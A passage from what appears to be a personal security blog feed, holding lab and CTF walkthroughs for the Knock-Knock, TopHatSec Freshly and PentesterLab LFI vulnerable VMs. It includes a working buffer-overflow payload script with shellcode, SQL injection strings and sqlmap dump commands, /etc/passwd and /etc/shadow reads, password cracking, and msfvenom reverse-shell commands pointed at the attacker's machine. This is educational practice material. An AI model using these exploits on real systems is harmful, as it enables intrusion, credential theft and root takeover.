<p>Then run NMAP scan to detect opening ports/running services on the target. From the result, only TCP port 1337 has been discovered running on Ubuntu Linux.
<code>nmap -v -sV -A -O -T4 -p- 10.10.10.140</code></p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/knock-knock/2.png"></p>

<h3>Port knocking</h3>

<p>In order to understand what Port Knocking is and how it works, I found the following 2 links: <a href="http://www.portknocking.org/">link_1</a>, <a href="https://www.digitalocean.com/community/tutorials/how-to-use-port-knocking-to-hide-your-ssh-daemon-from-attackers-on-ubuntu">link_2</a>.</p>

<p>Basically, I need to send SYN request to several random ports (3 in this case) in correct orders and valid time period, then the firewall or proxy will change the rules to open hidden ports.</p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/knock-knock/3.png"></p>

<p>Due to there are 3 ports and total 6 possible orders for the sequence, I wrote a script to try all the possibilities.</p>

<figure class='code'><figcaption><span>knock.py  (knock.py)</span> <a href='http://f4l13n5n0w.github.io/downloads/code/knock.py'>download</a></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/env python</span>
</span><span class='line'>
</span><span class='line'><span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
</span><span class='line'><span class="kn">from</span> <span class="nn">itertools</span> <span class="kn">import</span> <span class="n">permutations</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">time</span>
</span><span class='line'>
</span><span class='line'><span class="n">ip</span> <span class="o">=</span> <span class="s">&quot;10.10.10.140&quot;</span>            <span class="c">#target IP</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">Knockports</span><span class="p">(</span><span class="n">ports</span><span class="p">):</span>
</span><span class='line'>  <span class="k">for</span> <span class="n">port</span> <span class="ow">in</span> <span class="n">ports</span><span class="p">:</span>
</span><span class='line'>      <span class="k">try</span><span class="p">:</span>
</span><span class='line'>          <span class="k">print</span> <span class="s">&quot;[*] Knocking on port: &quot;</span><span class="p">,</span> <span class="n">port</span>
</span><span class='line'>          <span class="n">s2</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'>          <span class="n">s2</span><span class="o">.</span><span class="n">settimeout</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>           <span class="c"># set timeout in 0.1s</span>
</span><span class='line'>          <span class="n">s2</span><span class="o">.</span><span class="n">connect_ex</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
</span><span class='line'>          <span class="n">s2</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'>      <span class="k">except</span> <span class="ne">Exception</span><span class="p">,</span> <span class="n">e</span><span class="p">:</span>
</span><span class='line'>          <span class="k">print</span> <span class="s">&quot;[-] </span><span class="si">%s</span><span class="s">&quot;</span> <span class="o">%</span> <span class="n">e</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
</span><span class='line'>  <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span> <span class="mi">1337</span><span class="p">))</span>              <span class="c">#connect to port 1337 to grab three random ports</span>
</span><span class='line'>  <span class="n">r</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">))</span>  
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">print</span> <span class="s">&quot;received: &quot;</span><span class="p">,</span> <span class="n">r</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">for</span> <span class="n">comb</span> <span class="ow">in</span> <span class="n">permutations</span><span class="p">(</span><span class="n">r</span><span class="p">):</span>      <span class="c"># try all the possibility of 3-ports orders </span>
</span><span class='line'>      <span class="k">print</span> <span class="s">&quot;</span><span class="se">\n</span><span class="s">[*] Trying sequence </span><span class="si">%s</span><span class="s">&quot;</span> <span class="o">%</span> <span class="nb">str</span><span class="p">(</span><span class="n">comb</span><span class="p">)</span>
</span><span class='line'>      <span class="n">Knockports</span><span class="p">(</span><span class="n">comb</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">print</span> <span class="s">&quot;[*] Done&quot;</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="n">main</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/knock-knock/4.png"></p>

<p>After run the script, use nmap to check open services.</p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/knock-knock/5.png"></p>

<p>Now two more ports discovered: <code>22</code> and <code>80</code>.</p>

<p>Next I run nikto scan on port 80 and Dirbuster to guess hidden paths as standard procedure but nothing found, only the knock knock picture. So I downloaded the picture and use command <code>strings</code> to check if there is anything hidden in the the picture.</p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/knock-knock/6.png"></p>

<p>Bingo! Very juicy information found in the end:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Login Credentials
</span><span class='line'>abfnW
</span><span class='line'>sax2Cw90w</span></code></pre></td></tr></table></div></figure>


<p>After tried several different encryption methods, I found this is encrypted by <a href="https://en.wikipedia.org/wiki/Caesar_cipher">Caesar cipher</a> with ROT-13. There is an useful online <a href="http://www.xarg.org/tools/caesar-cipher/">Caesarian cipher decryption tool</a> which allow me to decrypt cipher text in different ROT number to detect the correct ROT number.</p>

<p>After decrypted:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>abfnW       -     nosaJ
</span><span class='line'>sax2Cw9Ow   -     fnk2Pj9Bj</span></code></pre></td></tr></table></div></figure>


<p>They are actually backwards, so the Login Credential is</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>username: Jason
</span><span class='line'>password: jB9jP2knf</span></code></pre></td></tr></table></div></figure>


<p>Now I can SSH login to the target (I tried &lsquo;Jason&rsquo; first but failed, when I tried all lower case &lsquo;jason&rsquo;, it works)</p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/knock-knock/7.png"></p>

<h3>Shell Escape</h3>

<p>Due to the current shell is Restricted, I use python <code>python -c "import pty; pty.spawn('/bin/bash')"</code> to escape.</p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/knock-knock/8.png"></p>

<p>By poking around, I found a binary program &lsquo;tfc&rsquo; with SUID bit set which normally can help us to get ROOT.</p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/knock-knock/9.png"></p>

<p>This is a file encryption program, first argument is the input file (plain text) and the second argument is the output file (cipher text), both of the input and output have to be <code>.tfc</code> extension.</p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/knock-knock/10.png"></p>

<p>As we can see above, reverse the input file and output file, it will decrypt the cipher text.</p>

<p>Now let&rsquo;s try a large file to see if it has Buffer Overflow vulnerability.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>jason@knockknock:~$ python -c "print 'A'*5000" > in.tfc
</span><span class='line'>jason@knockknock:~$ ./tfc in.tfc out.tfc
</span><span class='line'>Segmentation fault</span></code></pre></td></tr></table></div></figure>


<p>Segmentation fault!! sounds like it has BoF. Then I use <a href="link:%20http://www.trapkit.de/tools/checksec.html">searchsec.sh</a> to check what protections are enabled on it.</p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/knock-knock/11.png"></p>

<p>Cool, there is no any protection at all!</p>

<p>Due to gdb is not installed on the target machine, I have to download the tfc program to my Kali for further analyzing.</p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/knock-knock/12.png"></p>

<p>Why here is <code>0x0675c916</code> but not expected <code>0x41414141</code>? After playing around and further analysis, this should be encrypted of <code>0x41414141</code>. So I need the payload encrypted first. Thanks to <a href="https://knapsy.github.io/blog/2014/10/16/knock-knock-vm-walkthrough/">knapsy</a>. He provided a method to get encrypted data from core dump file. This method will save lots of time and works to reverse engineering the <code>tfc</code> program for re-writing the encryption script.</p>

<p>Next, I need to find where is the offset to just change the EIP. After tried several varying lengths and checking the value of return address in gdb. I finally found the offset to overwrite the return address (4124 bytes).</p>

<p>Due to 4 &lsquo;A&rsquo;s always starts with same bytes 'def0 5bab&rsquo; in encrypted file, So &lsquo;def0 5bab&rsquo; can be used as a pattern to locate encrypted data in core dump file.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# python -c 'print "A" * 100' > in.tfc
</span><span class='line'>root@kali:~# ./tfc in.tfc out.tfc
</span><span class='line'>>> File crypted, goodbye!
</span><span class='line'>root@kali:~# xxd out.tfc | head
</span><span class='line'>0000000: def0 5bab 5df7 ab43 0690 fe64 6cb0 0b48  ..[.]..C...dl..H</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# python -c 'print "A" * 5000' > in.tfc
</span><span class='line'>root@kali:~# ./tfc in.tfc out.tfc 
</span><span class='line'>Segmentation fault (core dumped)
</span><span class='line'>root@kali:~# xxd core | grep 'def0 5bab'
</span><span class='line'>0030700: def0 5bab 5df7 ab43 0690 fe64 6cb0 0b48  ..[.]..C...dl..H</span></code></pre></td></tr></table></div></figure>


<p>Next, use <code>msfelfscan</code> to get jmp esp address.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# msfelfscan -j esp tfc 
</span><span class='line'>[tfc]
</span><span class='line'>0x08048e93 jmp esp
</span><span class='line'>0x08048e93 jmp esp</span></code></pre></td></tr></table></div></figure>


<p>Then use msf with payload (<font color="red"><em>linux/x86/exec</em></font>) to generate shellcode</p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/knock-knock/13.png"></p>

<p><code>-b</code> switch will blacklist special characters.</p>

<p>Then I wrote a python script to output payload with shellcode.</p>

<figure class='code'><figcaption><span>payload.py  (payload.py)</span> <a href='http://f4l13n5n0w.github.io/downloads/code/payload.py'>download</a></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#/usr/bin/python</span>
</span><span class='line'>
</span><span class='line'><span class="n">shellcode</span> <span class="o">=</span> <span class="s">&quot;</span><span class="se">\xb8\x87\x10\x54\x8e\xd9\xc3\xd9\x74\x24\xf4\x5e\x29\xc9\xb1\x0b\x31\x46\x15\x83\xc6\x04\x03\x46\x11\xe2\x72\x7a\x5f\xd6\xe5\x29\x39\x8e\x38\xad\x4c\xa9\x2a\x1e\x3c\x5e\xaa\x08\xed\xfc\xc3\xa6\x78\xe3\x41\xdf\x73\xe4\x65\x1f\xab\x86\x0c\x71\x9c\x35\xa6\x8d\xb5\xea\xbf\x6f\xf4\x8d</span><span class="s">&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="n">content</span> <span class="o">=</span> <span class="s">&#39;A&#39;</span> <span class="o">*</span> <span class="mi">4124</span>
</span><span class='line'><span class="n">content</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\x93\x8e\x04\x08</span><span class="s">&quot;</span>               <span class="c"># 0x08048e93 jmp esp</span>
</span><span class='line'><span class="n">content</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\x90</span><span class="s">&quot;</span> <span class="o">*</span> <span class="mi">20</span>                       <span class="c"># padding 20 NOPs to protect shellcode</span>
</span><span class='line'><span class="n">content</span> <span class="o">+=</span> <span class="n">shellcode</span>
</span><span class='line'><span class="n">content</span> <span class="o">+=</span> <span class="s">&#39;C&#39;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">5000</span> <span class="o">-</span> <span class="mi">4124</span> <span class="o">-</span> <span class="mi">4</span> <span class="o">-</span><span class="mi">20</span> <span class="o">-</span><span class="mi">70</span><span class="p">)</span>  <span class="c"># padding with &#39;C&#39;</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="n">content</span>
</span></code></pre></td></tr></table></div></figure>


<p>Next, use <code>tfc</code> program to encrypt the payload and dump the encrypted data from core dump</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/Knock# python payload.py > in.tfc
</span><span class='line'>root@kali:~/Knock# ./tfc in.tfc out.tfc
</span><span class='line'>Segmentation fault (core dumped)
</span><span class='line'>root@kali:~/Knock# xxd /tmp/core-tfc-11-0-0-18419-1434802506 | grep 'def0 5bab'
</span><span class='line'>0034340: def0 5bab 5df7 ab43 0690 fe64 6cb0 0b48  ..[.]..C...dl..H</span></code></pre></td></tr></table></div></figure>


<p>Then use <code>dd</code> to carve out the encrypted data, byte by byte, skipping the first 213824 bytes (0034340 in HEX) and count is the length of exploit payload (5000 bytes)</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/Knock# dd if=/tmp/core-tfc-11-0-0-18419-1434802506 of=exp.tfc skip=213824 count=5000 bs=1
</span><span class='line'>5000+0 records in
</span><span class='line'>5000+0 records out
</span><span class='line'>5000 bytes (5.0 kB) copied, 0.0723968 s, 69.1 kB/s</span></code></pre></td></tr></table></div></figure>


<p>Now try to exploit &lsquo;tfc&rsquo; program with the encrypted exploit payload (exp.tfc):</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/Knock# ./tfc exp.tfc pwn.tfc
</span><span class='line'># id
</span><span class='line'>uid=0(root) gid=0(root) groups=0(root)
</span><span class='line'># exit</span></code></pre></td></tr></table></div></figure>


<p>Cool, it works on my Kali!</p>

<p>Now, upload <code>exp.tfc</code> to target machine and exploit <code>tfc</code> to get ROOT!</p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/knock-knock/14.png"></p>

<p>Done :)</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[[Vulnhub]TopHatSec: Freshly]]></title>
    <link href="http://f4l13n5n0w.github.io/blog/2015/06/13/vulnhub-tophatsec-freshly/"/>
    <updated>2015-06-13T04:57:26-04:00</updated>
    <id>http://f4l13n5n0w.github.io/blog/2015/06/13/vulnhub-tophatsec-freshly</id>
    <content type="html"><![CDATA[<p>&ldquo;The goal of this challenge is to break into the machine via the web and find the secret hidden in a sensitive file. If you can find the secret, send me an email for verification. :)
There are a couple of different ways that you can go with this one. Good luck!&rdquo; &ndash; <font color="green"><em>TopHatSec</em></font></p>

<p>&ldquo;VulnHub note: You may have issues when importing to VMware. If this is the case. extract the HDD from the OVA file (using something like 7zip), and attach to a new VM. Please see the following guide: <a href="https://jkad.github.io/blog/2015/04/12/how-to-import-the-top-hat-sec-vms-into-vmware/.">https://jkad.github.io/blog/2015/04/12/how-to-import-the-top-hat-sec-vms-into-vmware/.</a>&rdquo; &ndash; <font color="green"><em>VulnHub</em></font></p>

<p>More information and OVA file download please check <a href="https://www.vulnhub.com/entry/tophatsec-freshly,118/">here</a>.</p>

<h2>Links</h2>

<p>watch video online:</p>

<iframe src='http://player.vimeo.com/video/130604105?byline=0&amp;portrait=0&amp;color=c9ff23' width='720' height='360' frameborder='0' webkitAllowFullScreen mozallowfullscreen allowFullScreen></iframe>


<!-- more -->


<h2>Attacker &amp; Target</h2>

<p>Attacker: Kali Linux (<em>10.10.10.131/24</em>)</p>

<p>Target: TopHatSec: Freshly (<em>10.10.10.134/24</em>)</p>

<h2>Vulnerability &amp; Exploit</h2>

<ul>
<li>login.php - SQL Injection Vulnerability</li>
<li>weak/same passwords used</li>
<li>/etc/shadow file world readable</li>
</ul>


<h2>Method</h2>

<ul>
<li>Scanned the network to discover the target server [Net Discover]</li>
<li>Port scanned the target to discover the running services and open ports [nmap]</li>
<li>Web information gathering and interacting with the web server [firefox]</li>
<li>Web application scanned to dig more information about web service [nikto]</li>
<li>Exploit SQL injection vulnerability and dump wordpress admin password [sqlmap]</li>
<li>Upload PHP reverse shell and read /etc/passwd and /etc/shadow to greb sensitive information</li>
<li>Use john the ripper for brute-force cracking to get root&rsquo;s password</li>
<li>Generate and upload Linux meterpreter reverse shell and login as root with cracked password</li>
</ul>


<h2>Tools</h2>

<p>All the tools used here can be found in Kali Linux</p>

<ul>
<li><a href="http://nixgeneration.com/~jaime/netdiscover/">netdiscover</a></li>
<li><a href="https://nmap.org/">nmap</a></li>
<li><a href="https://cirt.net/Nikto2">nikto</a></li>
<li><a href="http://sqlmap.org/">sqlmap</a></li>
<li><a href="https://www.mozilla.org/en-US/firefox/new/">firefox</a></li>
<li><a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">php-reverse-shell</a></li>
</ul>


<h2>Walkthrough</h2>

<p>Using netdiscover as routine to detect the target&rsquo;s IP address and then run NMAP scan to detect opening ports/running services on the target. From the result, TCP port 80, 443 and 8080 have been discovered and the web server is apache 2.4.7 running on Ubuntu Linux.</p>

<p>Due to only web services are found, I decided to use <em>nikto</em> firstly to dig more information on port 80 and got the following result:</p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/freshly/1.png"></p>

<p>An login page has been found by <em>nikto</em> and I access <code>http://10.10.10.134/login.php</code> on firefox, it shows a login form with username and password input box.</p>

<p>Simply try some weak passwords such as <code>admin/admin</code> and get <code>0</code> responded which means login failed.</p>

<p>Then I tested simple SQL injection statements such as <code>' or 1=1 -- -</code> in username box and anything in password box, this time the server response <code>1</code> which means login successful.</p>

<p>Based on the test result, I know here is SQL injection vulnerability.</p>

<p>Now fire up <em>SQLMAP</em> to exploit it automatically.</p>

<p><code>sqlmap --url "http://10.10.10.134/login.php" --data "user=1*&amp;password=1&amp;s=Submit" --dbs</code></p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/freshly/2.png"></p>

<p><code>sqlmap --url "http://10.10.10.134/login.php" --data "user=1*&amp;password=1&amp;s=Submit" --smart --batch --dump -T users -D wordpress8080</code></p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/freshly/3.png"></p>

<p>Here we are, the wordpress admin credential has been dumped:</p>

<p><font color="red">admin / SuperSecretPassword</font></p>

<p>Next, modify the pentestmonkey&rsquo;s PHP reverse shell' IP and port to my Kali&rsquo;s port 5555 and setup NC to listen on this port.</p>

<p>Then by using the collected admin credential, I successfully logged in wordpress dashboard on server&rsquo;s port 8080.</p>

<p>Then go to <code>Appearance --&gt; Editor --&gt; function.php</code>, delete all the content and paste the reverse shell&rsquo;s php code before &ldquo;Update File&rdquo;</p>

<p>Now we got a shell with limited privilege. After poking around the file system, I read the passwd file which the secrets saved in the file too. Surprisingly, the shadow file also can be read.</p>

<p>So dump the passwd and shadow file to my kali and add all found passwords (<em>SuperSecretPassword</em>) into the dictionary file (I use <em>rockyou.txt</em> here)</p>

<p>Then use <em>john the ripper</em> to crack the hashes and got the following result:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>echo "SuperSecretPassword" > ~/tmp/dict.txt
</span><span class='line'>cat /usr/share/wordlists/rockyou.txt >> ~/tmp/dict.txt
</span><span class='line'>unshadow passwd.txt shadow.txt > unshadow.txt
</span><span class='line'>john unshadow.txt --wordlist=~/tmp/dict.txt</span></code></pre></td></tr></table></div></figure>


<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/freshly/4.png"></p>

<p>Bingo! the root user use the same password as wordpress admin.</p>

<p>In the meantime of cracking the passwords, I create and upload linux meterpreter reverse shell (<em>lmp443</em>) to target server in order to get a better interactive shell.</p>

<p><code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.10.131 LPORT=443 -f elf &gt; /var/www/lmp443</code></p>

<p>Then set up Metasploit on my Kali to use exploit <code>php/meterpreter/reverse_tcp</code> and listen on port <code>443</code></p>

<p>Then trigger the shell and get a meterpreter shell back to my Kali. Finally, use <code>su</code> command with cracked root password to get ROOT.</p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/freshly/5.png"></p>

<h2>Appendix</h2>

<p><strong>All passwords found/cracked:</strong></p>

<p><strong>Wordpress password:</strong></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>admin / SuperSecretPassword</span></code></pre></td></tr></table></div></figure>


<p><strong>login.php password:</strong></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>candyshop / password
</span><span class='line'>Sir / PopRocks</span></code></pre></td></tr></table></div></figure>


<p><strong>MySQL password:</strong></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root / SuperSecretPassword</span></code></pre></td></tr></table></div></figure>


<p><strong>User password:</strong></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root / SuperSecretPassword
</span><span class='line'>user / SuperSecretPassword
</span><span class='line'>candycane / password</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[[PentesterLab] PHP LFI &amp; Post Exploitation]]></title>
    <link href="http://f4l13n5n0w.github.io/blog/2015/05/31/pentesterlab-php-lfi-and-post-exploitation/"/>
    <updated>2015-05-31T05:19:10-04:00</updated>
    <id>http://f4l13n5n0w.github.io/blog/2015/05/31/pentesterlab-php-lfi-and-post-exploitation</id>
    <content type="html"><![CDATA[<p>&ldquo;This course details the discovery and the exploitation of PHP include vulnerabilities in a limited environment.
Then it introduces the basics of post exploitation: shell, reverse-shell and TCP redirection.&rdquo; &ndash; <font color="green"><em>PentesterLab</em></font></p>

<p>More information and ISO download please check <a href="https://www.pentesterlab.com/exercises/php_include_and_post_exploitation/">here</a>. The official <a href="https://www.pentesterlab.com/exercises/php_include_and_post_exploitation/course">course</a> is highly recommanded to read.</p>

<p>Difficulty: 2 / 5</p>

<h2>Links</h2>

<p>watch video online:</p>

<iframe src='http://player.vimeo.com/video/101763491?byline=0&amp;portrait=0&amp;color=c9ff23' width='720' height='360' frameborder='0' webkitAllowFullScreen mozallowfullscreen allowFullScreen></iframe>


<!-- more -->


<h2>Method</h2>

<ul>
<li>Scanned the network to discover the target server [Net Discover]</li>
<li>Port scanned the target to determine the running services on the target [Unicorn Scan]</li>
<li>Interacted with the web server, found the Local File Include (LFI) vulnerable point and a page with upload function. [Firefox]</li>
<li>Construct and upload a PHP shell onto the web server (have to bypass server end file validation). [Burp proxy]</li>
<li>Gain remote access by running the PHP shell via LFI vulnerability which we found before. [Burp proxy]</li>
</ul>


<h2>Tools</h2>

<p>All the tools used here can be found in Kali linux
* <a href="http://nixgeneration.com/~jaime/netdiscover/">Net Discover</a>
* <a href="http://www.unicornscan.org/">Unicorn Scan</a>
* <a href="https://www.mozilla.org/en-US/firefox/new/">Firefox</a>
* <a href="http://netcat.sourceforge.net/">Netcat</a>
* <a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">php-reverse-shell</a>
* <a href="https://www.gnu.org/software/wget/">Wget</a></p>

<h2>Walkthrough</h2>

<p>By reading the training <a href="https://www.pentesterlab.com/exercises/php_include_and_post_exploitation/course">course</a>, we know what kind of vulnerabilities should be targeted to. (PHP Include vulnerability is focused on this course)</p>

<h3>Find the LFI weakness</h3>

<p>The attacker interacts with the web server, by using Firefox browser to graphically render the web application on the target. Upon viewing the page, the attacker know that this site is calling for papers for a conference.</p>

<p>On the right hand side, which is the navigation menu to <font color="red"><em>home</em></font> (show the home page), <font color="red"><em>submit</em></font> (jump to paper upload form page) and <font color="red"><em>login</em></font> (which asks the attacker to login).</p>

<p>The attacker noticed the URL’s parameter is <code>?page=submit</code> in submit page and <code>?page=login</code> in login page. After the attacker tried to replace the parameter <code>submit</code> in submit page to <code>./login</code> and the login page is presented from the web server. That means here is the LFI vulnerable point.</p>

<p>In order to double check this vulnerability, the attacker construct the following URL <code>http://10.10.10.130/index.php?page=/etc/passwd</code> to extract the default passwd file in Linux. The attacker also check if the server is vulnerable to RFI by constructing the following URL <code>http://10.10.10.130/index.php?page=http://www.google.com/?</code>. However the server sent back error information which is illustrated that the PHP function for Remote file include is currently turned off (<font color="red"><em>allow_url_fopen = On but allow_url_include = Off</em></font>).</p>

<h3>Find the way to upload file (web shell) and the path where the uploaded file saved</h3>

<p>In the submit page, the attacker only can upload a pdf file to the server (<em>white list and file content is validated on the server end</em>).</p>

<p>Then the attacker input everything the form required and submit a normal pdf file. After that, successful uploaded page is presented. The attacker login to the web server with the information he just provided in the submit form and he found the uploaded PDF file is saved under the <code>uploads</code> folder.</p>

<h3>Bypass file upload validation</h3>

<p>The attacker can only upload a PDF file due to the white list and file content validation is running on the server side. However, many file content validation only check file header which usually first bytes of a file. So the attacker create a fake PDF file (evil.pdf) which has normal PDF header and followed by the PHP shell code (<em>here the attacker using <a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">Pentest Monkey’s PHP reserve shell</a>, which is able to connect back from the target to the attacker</em>).</p>

<p>Then the attacker upload the file <code>evil.php</code> to the server. Because it is only executed when someone visits the page, the attacker quickly creates a listener to wait for the PHP shell to connect back.</p>

<p>After the attacker browse the page on the server, it causes the PHP code to be executed and a connection back to the attacker. Now, the attacker has an interactive shell on the target.</p>

<h2>Reference:</h2>

<ol>
<li><a href="https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion">OWASP Test LFI</a></li>
<li><a href="http://en.wikipedia.org/wiki/Passwd">passwd file</a></li>
<li><a href="http://php.net/manual/en/filesystem.configuration.php">php.ini configuration file</a></li>
<li><a href="https://www.owasp.org/index.php/Unrestricted_File_Upload">Bypass file upload validation</a></li>
</ol>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[[PentesterLab] Axis2 Web service and Tomcat Manager]]></title>
    <link href="http://f4l13n5n0w.github.io/blog/2015/05/30/pentesterlab-axis2-web-service-and-tomcat-manager/"/>
    <updated>2015-05-30T08:16:43-04:00</updated>
    <id>http://f4l13n5n0w.github.io/blog/2015/05/30/pentesterlab-axis2-web-service-and-tomcat-manager</id>
